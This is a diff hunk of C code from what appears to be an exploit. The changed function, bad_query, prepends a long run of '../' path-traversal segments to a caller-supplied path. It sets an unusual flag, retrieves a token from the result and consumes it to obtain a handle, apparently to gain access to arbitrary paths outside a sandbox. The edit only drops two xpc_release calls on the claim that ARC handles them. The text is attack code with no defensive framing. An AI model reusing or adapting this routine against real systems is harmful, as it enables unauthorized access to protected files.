@@ -41,7 +41,7 @@ int64_t bad_query(const char *path, bool create) {
     setIDs(query, identifier);
     setPart(query, 3);
     char *domain = NULL;
-    if (asprintf(&domain, "../../../../../../../..%s", path) == -1) { xpc_release(identifier); freeQuery(query); dlclose(mgr); return -5; }
+    if (asprintf(&domain, "../../../../../../../..%s", path) == -1) { freeQuery(query); dlclose(mgr); return -5; }
     setDomain(query, domain);
     setFlags(query, 0x0000008000000000ULL);
     void *result = getResult(query);
@@ -50,7 +50,8 @@ int64_t bad_query(const char *path, bool create) {
         char *token = copyToken(result);
         if (token) { handle = consume(token); free(token); }
     }
-    free(domain); xpc_release(identifier); freeQuery(query); dlclose(mgr);
+    // ARC releases the local XPC object when this scope ends.
+    free(domain); freeQuery(query); dlclose(mgr);
     return handle;
 }
 
